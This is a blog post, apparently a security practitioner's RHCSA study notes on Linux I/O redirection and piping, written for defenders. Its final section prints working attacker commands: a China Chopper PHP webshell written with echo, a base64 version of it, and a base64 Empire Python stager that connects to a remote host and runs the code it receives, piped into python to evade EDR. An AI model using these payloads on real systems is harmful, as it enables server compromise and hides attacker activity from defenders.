<!DOCTYPE html>
<html lang="en">




<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>
    
    Road to RHCSA 8 - I/O Redirection, Piping, and Their Evil Uses
     | Tony Lambert 
  </title>
  <link rel="stylesheet" href='https://forensicitguy.github.io/css/site.min.79fe936623aa76027ec7f37e2c1f88575bc07ec92581712940e3dd619a002236e0522d1202b5d1f6df0ddca3a2aea9a163ce58001d960ed138f4f19e83fa83db.css' integrity='sha512-ef6TZiOqdgJ&#43;x/N&#43;LB&#43;IV1vAfsklgXEpQOPdYZoAIjbgUi0SArXR9t8N3KOirqmhY85YAB2WDtE49PGeg/qD2w=='>
  <link rel="canonical" href="https://forensicitguy.github.io/posts/road-to-rhcsa8-input-redirection/">
  <link rel="alternate" type="application/rss&#43;xml" href="https://forensicitguy.github.io/index.xml" title="Where DFIR Meets IT">
  <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="chrome=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="referrer" content="no-referrer">
<meta name="author" content="Tony Lambert">
<meta name="description" content="Bourne-compatible Unix shells (bash, sh, etc.) usually include capabilities to redirect input and output in the shell. One of the basic objectives of RHCSA 8 is to learn how to manipulate input and output, and since I work in security I wanted to put a spin on the content to show how adversaries may use I/O redirection to stump defenders. If you already know about I/O redirection and you&rsquo;re just here for the security stuff, jump forward here.">

<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/forensicitguy.github.io"
        },
        "articleSection" : "posts",
        "name" : "Road to RHCSA 8 - I\/O Redirection, Piping, and Their Evil Uses",
        "headline" : "Road to RHCSA 8 - I\/O Redirection, Piping, and Their Evil Uses",
        "description" : "Bourne-compatible Unix shells (bash, sh, etc.) usually include capabilities to redirect input and output in the shell. One of the basic objectives of RHCSA 8 is to learn how to manipulate input and output, and since I work in security I wanted to put a spin on the content to show how adversaries may use I\/O redirection to stump defenders. If you already know about I\/O redirection and you\x26rsquo;re just here for the security stuff, jump forward here.",
        "inLanguage" : "en-US",
        "author" : "Tony Lambert",
        "creator" : "Tony Lambert",
        "publisher": "Tony Lambert",
        "accountablePerson" : "Tony Lambert",
        "copyrightHolder" : "Tony Lambert",
        "copyrightYear" : "2020",
        "datePublished": "2020-02-29 15:08:25 -0600 CST",
        "dateModified" : "2020-02-29 15:08:25 -0600 CST",
        "url" : "https:\/\/forensicitguy.github.io\/posts\/road-to-rhcsa8-input-redirection\/",
        "wordCount" : "1124",
        "keywords" : [ "RedHat","RHCSA","Linux","certification","Redirection","Input","Output","Piping","Python","Base64","Bash","Blog" ]
    }
</script>

<meta property="og:title" content="Road to RHCSA 8 - I/O Redirection, Piping, and Their Evil Uses" />
<meta property="og:description" content="Bourne-compatible Unix shells (bash, sh, etc.) usually include capabilities to redirect input and output in the shell. One of the basic objectives of RHCSA 8 is to learn how to manipulate input and output, and since I work in security I wanted to put a spin on the content to show how adversaries may use I/O redirection to stump defenders. If you already know about I/O redirection and you&rsquo;re just here for the security stuff, jump forward here." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://forensicitguy.github.io/posts/road-to-rhcsa8-input-redirection/" />
<meta property="article:published_time" content="2020-02-29T15:08:25-06:00" />
<meta property="article:modified_time" content="2020-02-29T15:08:25-06:00" />

</head>
<body><nav class="navbar is-transparent " role="navigation" aria-label="main navigation">
  <div class="navbar-brand">
    <a class="navbar-item" href="https://forensicitguy.github.io/">
      <figure class="image">
        <img alt="" class="is-rounded" src="https://www.gravatar.com/avatar/c0ec92ffadd1bc3cba3cf9364ea250d6?s=128&d=identicon">
      </figure>
    </a>
    <a class="navbar-item" href="https://forensicitguy.github.io/">
      Where DFIR Meets IT
    </a>
  </div>
  
  <div class="navbar-menu">
    <div class="navbar-start">
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/activedirectory/">
        
        Active directory
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/administrators/">
        
        Administrators
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/base64/">
        
        Base64
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/bash/">
        
        Bash
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/centos-8/">
        
        Cent o s 8
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/certification/">
        
        Certification
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/chrome/">
        
        Chrome
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/dfir/">
        
        DFIR
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/dnf/">
        
        DNF
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/domaincontrollers/">
        
        Domain controllers
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/edr/">
        
        Edr
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/education/">
        
        Education
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/evasion/">
        
        Evasion
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/input/">
        
        Input
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/jar/">
        
        Jar
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/ld_audit/">
        
        Ld audit
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/ld_preload/">
        
        Ld preload
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/libpreloadvaccine/">
        
        Libpreloadvaccine
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/linux/">
        
        Linux
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/localaccounts/">
        
        Local accounts
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/merlin/">
        
        Merlin
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/metasploit/">
        
        Metasploit
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/meterpreter/">
        
        Meterpreter
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/msfvenom/">
        
        Msfvenom
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/netwars/">
        
        Net wars
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/output/">
        
        Output
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/package-manager/">
        
        Package manager
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/penetration-testing/">
        
        Penetration testing
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/persistence/">
        
        Persistence
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/piping/">
        
        Piping
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/plugin/">
        
        Plugin
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/python/">
        
        Python
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/red-hat-enterprise-linux-8/">
        
        Red hat enterprise linux 8
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/red-team/">
        
        Red team
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/redhat/">
        
        Red hat
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/redirection/">
        
        Redirection
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/redteam/">
        
        Red team
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/rhcsa/">
        
        RHCSA
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/sans/">
        
        SANS
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/unix/">
        
        Unix
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/whitelisting/">
        
        Whitelisting
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/windows/">
        
        Windows
        
      </a>
      
      <a class="navbar-item" href="https://forensicitguy.github.io/tags/yum/">
        
        Yum
        
      </a>
      
    </div>
    
    <div class="navbar-end">
      
      <a class="navbar-item" href="https://github.com/ForensicITGuy" rel="noopener" target="_blank">
        <span class="icon">
          
            <img alt="icons/svg/github.svg" src='https://forensicitguy.github.io/icons/svg/github.svg'>
          
        </span>
      </a>
      
      <a class="navbar-item" href="https://linkedin.com/in/tonymlambert" rel="noopener" target="_blank">
        <span class="icon">
          
            <img alt="icons/svg/linkedin.svg" src='https://forensicitguy.github.io/icons/svg/linkedin.svg'>
          
        </span>
      </a>
      
      <a class="navbar-item" href="https://twitter.com/ForensicITGuy" rel="noopener" target="_blank">
        <span class="icon">
          
            <img alt="icons/svg/twitter.svg" src='https://forensicitguy.github.io/icons/svg/twitter.svg'>
          
        </span>
      </a>
      
      <a class="navbar-item" href="mailto:tmlambert13@gmail.com" target="_blank">
        <span class="icon">
          <img alt="email" src='https://forensicitguy.github.io/icons/svg/email.svg'>
        </span>
      </a>
      <a class="navbar-item" href="https://forensicitguy.github.io/index.xml" target="_blank">
        <span class="icon">
          <img alt="rss" src='https://forensicitguy.github.io/icons/svg/rss.svg'>
        </span>
      </a>
      
    </div>
  </div>
</nav>
<section class="hero is-small is-info is-fullwidth">
  <div class="hero-body">
<div class="container">
  <h1 class="title">
    Road to RHCSA 8 - I/O Redirection, Piping, and Their Evil Uses
  </h1>
  <h2 class="subtitle">
    <time datetime='2020-02-29T15:08:25-06:00'>
      February 29, 2020
    </time>
    
    <br>
    
    
    
    <a class="tag is-link" href="https://forensicitguy.github.io/tags/redhat/">RedHat</a>
    
    
    
    
    <a class="tag is-link" href="https://forensicitguy.github.io/tags/rhcsa/">RHCSA</a>
    
    
    
    
    <a class="tag is-link" href="https://forensicitguy.github.io/tags/linux/">Linux</a>
    
    
    
    
    <a class="tag is-link" href="https://forensicitguy.github.io/tags/certification/">certification</a>
    
    
    
    
    <a class="tag is-link" href="https://forensicitguy.github.io/tags/redirection/">Redirection</a>
    
    
    
    
    <a class="tag is-link" href="https://forensicitguy.github.io/tags/input/">Input</a>
    
    
    
    
    <a class="tag is-link" href="https://forensicitguy.github.io/tags/output/">Output</a>
    
    
    
    
    <a class="tag is-link" href="https://forensicitguy.github.io/tags/piping/">Piping</a>
    
    
    
    
    <a class="tag is-link" href="https://forensicitguy.github.io/tags/python/">Python</a>
    
    
    
    
    <a class="tag is-link" href="https://forensicitguy.github.io/tags/base64/">Base64</a>
    
    
    
    
    <a class="tag is-link" href="https://forensicitguy.github.io/tags/bash/">Bash</a>
    
    
    
  </h2>
</div>

  </div>
</section>
<section class="section">
  <div class="container">
<div class="content is-medium">
  <p>Bourne-compatible Unix shells (<code>bash</code>, <code>sh</code>, etc.) usually include capabilities to redirect input and output in the shell. One of the basic objectives of RHCSA 8 is to learn how to manipulate input and output, and since I work in security I wanted to put a spin on the content to show how adversaries may use I/O redirection to stump defenders. If you already know about I/O redirection and you&rsquo;re just here for the security stuff, <a href="#-Evil-Uses-of-Redirection-and-Piping">jump forward here</a>.</p>
<h2 id="basics-of-io-redirection">Basics of I/O Redirection</h2>
<h3 id="in-and-out-again">In and Out Again</h3>
<p>From the moment you begin interacting with Linux systems you use the standard forms of input and output- <code>stdin</code> and <code>stdout</code>. The <code>stdin</code> stream usually comes from the keyboard and represents what you type into the command-line interface to interact with Linux. The <code>stdout</code> stream is the opposite, text that echoes to the console outputting from programs. Consider this command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;Hello World&#34;</span>
</code></pre></div><p>In this case, the <code>stdin</code> stream is provided by reading <code>&quot;Hello World&quot;</code> and the <code>stdout</code> stream is the display of what is echoed to the console. Millions of Linux devices across the world could work with just displaying things to the console, but they work a lot better making use of redirection. The most fundamental use of redirection comes from the <code>&gt;</code> character. This will place the output of a program into a file. For example, I use this command frequently when analyzing malware:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ strings malware.bin &gt; malware.strings.txt
</code></pre></div><p>This command takes the output of <code>strings</code> and redirects it into the file <code>malware.strings.txt</code> so I can read it later at my convenience. Keep in mind that <code>&gt;</code> operator will overwrite files without warning. If I execute another command to redirect output into <code>malware.strings.txt</code> it will be overwritten. If I want to append text to the same file, I have to use <code>&gt;&gt;</code> instead. When I use it, the commands look something like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ strings -eL malware.bin &gt;&gt; malware.strings.txt
</code></pre></div><p>In this case, the output of <code>strings</code> is appended to my previous text file.</p>
<p>An operation that&rsquo;s a bit less common is input redirection using <code>&lt;</code> and <code>&lt;&lt;</code>. In these cases, you can use the contents of files as the <code>stdin</code> stream. In the first example, <code>sort</code> will take <code>/etc/passwd</code> as <code>stdin</code> and provide the normal console output:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sort &lt; /etc/passwd
</code></pre></div><p>In the case of <code>&lt;&lt;</code> you can specify for the shell to read until it reaches a specific delimiter:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wc -m <span style="color:#e6db74">&lt;&lt;EOF
</span><span style="color:#e6db74">&gt; thing
</span><span style="color:#e6db74">&gt; thing
</span><span style="color:#e6db74">&gt; EOF</span>
<span style="color:#ae81ff">12</span>
</code></pre></div><p>That last one (<code>&lt;&lt;</code>) is much more useful in script form than on the command line.</p>
<h3 id="everyone-makes-errors">Everyone Makes Errors</h3>
<p>The third I/O stream is <code>stderr</code>. Imagine if <code>stdout</code> received only diagnostic and error information, and that&rsquo;s the simplification of this stream. You can use <code>2&gt;</code> to output this stream to a file, if desired. In this case, I attempt to copy a file into a folder that I shouldn&rsquo;t without root privileges:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ touch ~/delete-me.txt
$ cp ~/delete-me.txt /etc/ 2&gt; copy-errors.txt
</code></pre></div><p>If desired, you can also prevent any errors from showing on the console. You can do this by using a <strong>device file</strong> named <code>/dev/null</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ touch ~/delete-me.txt
$ cp ~/delete-me.txt /etc/ 2&gt; /dev/null
</code></pre></div><h3 id="thats-not-lead-piping">That&rsquo;s Not Lead Piping</h3>
<p>Alongside output redirection, you&rsquo;ll likely use piping frequently in Linux. A pipe is represented by <code>|</code> and will let you directly use the output from one command as the <code>stdin</code> stream of another. Consider this command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ strings malware.bin | less
</code></pre></div><p>The command will take the output from <code>strings</code> and let me immediately inspect it with <code>less</code>. This sort of action is commonly used to scroll through many lines of output without it rushing by in the console. This can also be used numerous times in a row:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat ~/wordlist.txt | uniq | sort &gt; sorted-dedup-list.txt
</code></pre></div><p>In this case, I piped the output of <code>cat</code> into <code>uniq</code> to remove duplicates, and that output was further <code>sort</code>ed and redirected into a file.</p>
<h3 id="file-descriptors-nothing-clever">File Descriptors (nothing clever)</h3>
<p>As you dive deeper into Linux internals you&rsquo;ll eventually encounter <strong>file descriptors</strong>. These structures are handles to files used by a program when they are opened. If you want, on Linux systems you can check out file descriptors for a process under <code>/proc/[pid]/fd</code>. For processes you typically interact with, there are three guaranteed file descriptors open: 0, 1, and 2. These correspond to <code>stdin</code>, <code>stdout</code>, and <code>stderr</code>, respectively. This is the reason you can manipulate <code>stderr</code> with <code>2&gt;</code>. Due to this, you can also manipulate <code>stdin</code> and <code>stdout</code> with <code>0&lt;</code>, <code>1&gt;</code>, and <code>1&gt;&gt;</code>.</p>
<h2 id="evil-uses-of-redirection-and-piping">Evil Uses of Redirection and Piping</h2>
<p>Adversaries can use redirection effectively during exploitation. Let&rsquo;s imagine a scenario where an adversary exploits a web server and can issue commands. They can&rsquo;t yet upload files, but they can manipulate whatever they want in text form. We may see something like this during exploitation:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sh -c echo <span style="color:#e6db74">&#34;&lt;?php @eval(</span>$_POST<span style="color:#e6db74">[&#39;password&#39;]);?&gt;&#34;</span> &gt; china-chopper.php
</code></pre></div><p>This command creates a webshell (without uploading a file) an adversary can use to issue further commands in an easier format. We can easily write an endpoint-based detection for this by looking for command lines including <code>echo</code>, <code>@eval($_POST</code>, and <code>&gt;</code>.</p>
<p>Adversaries can make this more difficult by using <code>base64</code> to obscure what they write into a file:</p>
<pre><code>$ echo &quot;&lt;?php @eval($_POST['password']);?&gt;&quot; | base64
PD9waHAgQGV2YWwoWydwYXNzd29yZCddKTs/Pgo=

$ sh -c echo PD9waHAgQGV2YWwoWydwYXNzd29yZCddKTs/Pgo= | base64 -d &gt; china-chopper.php
</code></pre><p>This creation of <code>china-chopper.php</code> achieves the same result but evades command-line based detections of the webshell contents.</p>
<p>In another example, let&rsquo;s look at an Empire Python agent:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;import base64,sys;exec(base64.b64decode(aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEwLjEwLjEwLjEwJyw4NDQzKSkKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyhkLHsncyc6c30pCg==)&#34;</span>
</code></pre></div><p>If we examine this process with tools like EDR, we&rsquo;ll see the malicious Python code in the command line arguments for the process. We can easily write a detection for suspicious Python command line value <code>exec(base64.b64decode(</code>. Adversaries can bypass this using piping again:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sh -c echo aW1wb3J0IGJhc2U2NCxzeXM7ZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKGFXMXdiM0owSUhOdlkydGxkQ3h6ZEhKMVkzUXNkR2x0WlFwbWIzSWdlQ0JwYmlCeVlXNW5aU2d4TUNrNkNnbDBjbms2Q2drSmN6MXpiMk5yWlhRdWMyOWphMlYwS0RJc2MyOWphMlYwTGxOUFEwdGZVMVJTUlVGTktRb0pDWE11WTI5dWJtVmpkQ2dvSnpFd0xqRXdMakV3TGpFd0p5dzRORFF6S1NrS0NRbGljbVZoYXdvSlpYaGpaWEIwT2dvSkNYUnBiV1V1YzJ4bFpYQW9OU2tLYkQxemRISjFZM1F1ZFc1d1lXTnJLQ2MrU1Njc2N5NXlaV04yS0RRcEtWc3dYUXBrUFhNdWNtVmpkaWhzS1FwM2FHbHNaU0JzWlc0b1pDazhiRG9LQ1dRclBYTXVjbVZqZGloc0xXeGxiaWhrS1NrS1pYaGxZeWhrTEhzbmN5YzZjMzBwQ2c9PSk<span style="color:#f92672">=</span> | base64 -d | python
</code></pre></div><p>This Python execution is much harder to investigate using EDR and similar tools. In this case, an adversary can hide their command line options using more <code>base64</code> encoding and use piping to pass the code as input. When we investigate the <code>python</code> process in EDR, there will be no command lines showing the contents of the executed script. Instead, the process has read the script it needs to execute from <code>stdin</code>, which likely won&rsquo;t be captured by tools. Best of all, this is functionally the same as the previous command.</p>
<h2 id="improving-security-tools">Improving Security Tools</h2>
<p>In my adventures so far with security tools it seems that <code>stdin</code> and <code>stdout</code> is sometimes a blind spot, especially when piping is used. One of the better ways to improve tools in the next few years would be adding the ability to inspect these streams where possible.</p>
<p>For those of you joining me on the road to RHCSA 8, good luck when studying!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="http://man7.org/linux/man-pages/man3/stdin.3.html">stdin manpage</a></li>
</ul>

</div>


  </div>
</section><footer class="footer">
  <div class="content has-text-centered">
    
    
    <p>
      
      
    </p>
    
  </div>
</footer>


<script type="application/javascript">
var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
var doNotTrack = (dnt == "1" || dnt == "yes");
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-155060013-1', 'auto');
	ga('set', 'anonymizeIp', true);
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>

</body>
</html>
